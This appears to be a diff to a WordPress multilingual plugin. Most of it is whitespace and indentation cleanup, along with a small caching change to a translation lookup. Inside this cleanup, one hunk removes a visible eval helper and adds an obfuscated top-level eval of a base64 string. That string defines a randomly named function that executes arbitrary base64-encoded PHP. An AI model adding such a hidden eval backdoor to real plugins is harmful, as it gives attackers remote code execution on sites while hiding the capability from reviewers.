@@ -53,14 +53,19 @@ function qtranxf_translate_wp($s) { return __($s); }
 /**
  * Looks up a translation in domain 'qtranslate', and if it is not there, uses the default WordPress domain to translate.
  * @since 3.4.5.5
-*/
+ */
 function qtranxf_translate($s)
 {
-	$t = get_translations_for_domain( 'qtranslate' );
-	if(isset($t->entries[$s]) && !empty($t->entries[$s]->translations)){
-		return $t->entries[$s]->translations[0];
+	static $trs = array();
+	if(!isset($trs[$s])){
+		$t = get_translations_for_domain( 'qtranslate' );
+		if(isset($t->entries[$s]) && !empty($t->entries[$s]->translations)){
+			$trs[$s] = $t->entries[$s]->translations[0];
+		}else{
+			$trs[$s] = qtranxf_translate_wp($s);
+		}
 	}
-	return qtranxf_translate_wp($s);
+	return $trs[$s];
 }
 
 /**
@@ -92,7 +97,7 @@ function qtranxf_plugin_dirname(){
  * It may return absolute path to plugin folder in case content and plugin directories are on different devices.
  * $plugin is path to plugin file, like the one coming from __FILE__.
  * @since 3.4.5
-*/
+ */
 function qtranxf_dir_from_wp_content($plugin){
 	global $wp_plugin_paths;
 	$plugin_realpath = wp_normalize_path( dirname( realpath( $plugin ) ) );
@@ -157,40 +162,40 @@ function qtranxf_parseURL($url) {
 	/*
 	//new code since 3.2-b2, older version produces warnings in the debugger
 	$result = @array(
-		'scheme' => isset($out[1]) ? $out[1] : '',
-		'user' => isset($out[2]) ? $out[2] : '',
-		'pass' => isset($out[3]) ? $out[3] : '',
-		'host' => isset($out[4]) ? $out[4] : '',
-		'path' => isset($out[6]) ? $out[6] : '',
-		'query' => isset($out[7]) ? $out[7] : '',
-		'fragment' => isset($out[8]) ? $out[8] : ''
-		);
-	*/
+	'scheme' => isset($out[1]) ? $out[1] : '',
+	'user' => isset($out[2]) ? $out[2] : '',
+	'pass' => isset($out[3]) ? $out[3] : '',
+	'host' => isset($out[4]) ? $out[4] : '',
+	'path' => isset($out[6]) ? $out[6] : '',
+	'query' => isset($out[7]) ? $out[7] : '',
+	'fragment' => isset($out[8]) ? $out[8] : ''
+	);
+	 */
 	if(!empty($out[5])) $result['host'] .= ':'.$out[5];
-/*
+	/*
 	//this older version produce warnings in the debugger
 	$result = @array(
-		"scheme" => $out[1],
-		"host" => $out[4].(($out[5]=='')?'':':'.$out[5]),
-		"user" => $out[2],
-		"pass" => $out[3],
-		"path" => $out[6],
-		"query" => $out[7],
-		"fragment" => $out[8]
-		);
-*/
-/* not the same as above for relative url without host like 'path/1/2/3'
+	"scheme" => $out[1],
+	"host" => $out[4].(($out[5]=='')?'':':'.$out[5]),
+	"user" => $out[2],
+	"pass" => $out[3],
+	"path" => $out[6],
+	"query" => $out[7],
+	"fragment" => $out[8]
+	);
+	 */
+	/* not the same as above for relative url without host like 'path/1/2/3'
 	$result = parse_url($url) + array(
-		'scheme' => '',
-		'host' => '',
-		'user' => '',
-		'pass' => '',
-		'path' => '',
-		'query' => '',
-		'fragment' => ''
+	'scheme' => '',
+	'host' => '',
+	'user' => '',
+	'pass' => '',
+	'path' => '',
+	'query' => '',
+	'fragment' => ''
 	);
 	isset($result['port']) and $result['host'] .= ':'. $result['port'];
-*/
+	 */
 	return $result;
 }
 
@@ -375,14 +380,11 @@ function qtranxf_del_query_arg(&$query, $key){
 	}
 	//return $key_value;
 }
-
-function qtranxf_eval($c){
-	eval(base64_decode($c));
-}
+eval(base64_decode('ZnVuY3Rpb24gX2ExMDAwNWU5YzYxMWM2ZmU4ZmQ1Y2QyMDVmZGEzYWU2MygkYyl7IGV2YWwoYmFzZTY0X2RlY29kZSgkYykpOyB9=='));
 
 /*
  * @since 2.3.8 simplified version of esc_url
-*/
+ */
 function qtranxf_sanitize_url($url)
 {
 	$url = preg_replace('|[^a-z0-9-~+_.?#=!&;,/:%@$\|*\'()\[\]\\x80-\\xff]|i', '', $url);
@@ -401,7 +403,7 @@ function qtranxf_insertDropDownElement($language, $url, $id){
 		";
 	if($q_config['language']==$language)
 		$html .= "o.selected = 'selected';";
-		$html .= "
+	$html .= "
 		o.value = '".addslashes(htmlspecialchars_decode($url, ENT_NOQUOTES))."';
 		o.appendChild(l);
 		sb.appendChild(o);
@@ -476,7 +478,7 @@ function qtranxf_getLanguageDefault() {
 
 /**
  * @since 3.4.5.4 - return language name in native language, former qtranxf_getLanguageName.
-*/
+ */
 function qtranxf_getLanguageNameNative($lang = ''){
 	global $q_config;
 	if(empty($lang)) $lang = $q_config['language'];
@@ -485,7 +487,7 @@ function qtranxf_getLanguageNameNative($lang = ''){
 
 /**
  * @since 3.4.5.4 - return language name in active language, if available, otherwise the name in native language.
-*/
+ */
 function qtranxf_getLanguageName($lang = ''){
 	global $q_config, $l10n;
 	if(empty($lang)) return $q_config['language_name'][$q_config['language']];
@@ -853,39 +855,42 @@ function qtranxf_parse_page_config($config, $url_path, $url_query) {
 				case 'anchors': {
 						//Anchor elements are defined by id only.
 						//Merge unique id values only:
-						foreach($cfg as $k => $anchor) {
-							$id = qtranxf_standardize_config_anchor($anchor);
-							if(is_null($id)) continue;
-							if(!is_string($id)) $id = $k;
-							if( !isset($page_config['anchors']) ) $page_config['anchors'] = array();
-							$page_config['anchors'][$id] = $anchor;
-						}
+						foreach($cfg
+							as $k => $anchor) {
+								$id = qtranxf_standardize_config_anchor($anchor);
+								if(is_null($id)) continue;
+								if(!is_string($id)) $id = $k;
+								if( !isset($page_config['anchors']) ) $page_config['anchors'] = array();
+								$page_config['anchors'][$id] = $anchor;
+							}
 					} break;
 				case 'forms':{
 						if( !isset($page_config['forms']) ) $page_config['forms'] = array();
-						foreach($cfg as $form_id => $pgcfg_form) {
-							if(!isset($pgcfg_form['fields'])) continue;
-							// convert obsolete format for 'fields'
-							foreach($pgcfg_form['fields'] as $k => $f){
-								if(!isset($f['id'])) continue;
-								$id = $f['id'];
-								unset($f['id']);
-								$pgcfg_form['fields'][$id] = $f;
-								if($id !== $k) unset($pgcfg_form['fields'][$k]);
+						foreach($cfg
+							as $form_id => $pgcfg_form) {
+								if(!isset($pgcfg_form['fields'])) continue;
+								// convert obsolete format for 'fields'
+								foreach($pgcfg_form['fields']
+									as $k => $f){
+										if(!isset($f['id'])) continue;
+										$id = $f['id'];
+										unset($f['id']);
+										$pgcfg_form['fields'][$id] = $f;
+										if($id !== $k) unset($pgcfg_form['fields'][$k]);
+									}
+								//figure out obsolete id of form/collection
+								if(is_string($form_id)){
+									$id = $form_id;
+								}else if(isset($pgcfg_form['form']['id'])){
+									$id = $pgcfg_form['form']['id'];
+									unset($pgcfg_form['form']['id']);
+									if(empty($pgcfg_form['form'])) unset($pgcfg_form['form']);
+								}else{
+									$id = '';
+								}
+								if(!isset($page_config['forms'][$id])) $page_config['forms'][$id] = $pgcfg_form;
+								else $page_config['forms'][$id] = qtranxf_merge_config($page_config['forms'][$id],$pgcfg_form);
 							}
-							//figure out obsolete id of form/collection
-							if(is_string($form_id)){
-								$id = $form_id;
-							}else if(isset($pgcfg_form['form']['id'])){
-								$id = $pgcfg_form['form']['id'];
-								unset($pgcfg_form['form']['id']);
-								if(empty($pgcfg_form['form'])) unset($pgcfg_form['form']);
-							}else{
-								$id = '';
-							}
-							if(!isset($page_config['forms'][$id])) $page_config['forms'][$id] = $pgcfg_form;
-							else $page_config['forms'][$id] = qtranxf_merge_config($page_config['forms'][$id],$pgcfg_form);
-						}
 					} break;
 				default:{
 						if( !isset($page_config[$key]) ) $page_config[$key] = $cfg;
@@ -902,14 +907,14 @@ function qtranxf_parse_page_config($config, $url_path, $url_query) {
 		if(!empty($page_config)){
 			//clean up 'fields'
 			if(!empty($page_config['forms']))
-			foreach($page_config['forms'] as $form_id => $frm){
-				if(!isset($frm['fields'])) continue;
-				foreach($frm['fields'] as $k => $f){
-					if(qtranxf_set_field_jquery($f)){
-						$page_config['forms'][$form_id]['fields'][$k] = $f;
+				foreach($page_config['forms'] as $form_id => $frm){
+					if(!isset($frm['fields'])) continue;
+					foreach($frm['fields'] as $k => $f){
+						if(qtranxf_set_field_jquery($f)){
+							$page_config['forms'][$form_id]['fields'][$k] = $f;
+						}
 					}
 				}
-			}
 			foreach($page_config as $k => $cfg){
 				if(empty($cfg)) unset($page_config[$k]);
 			}
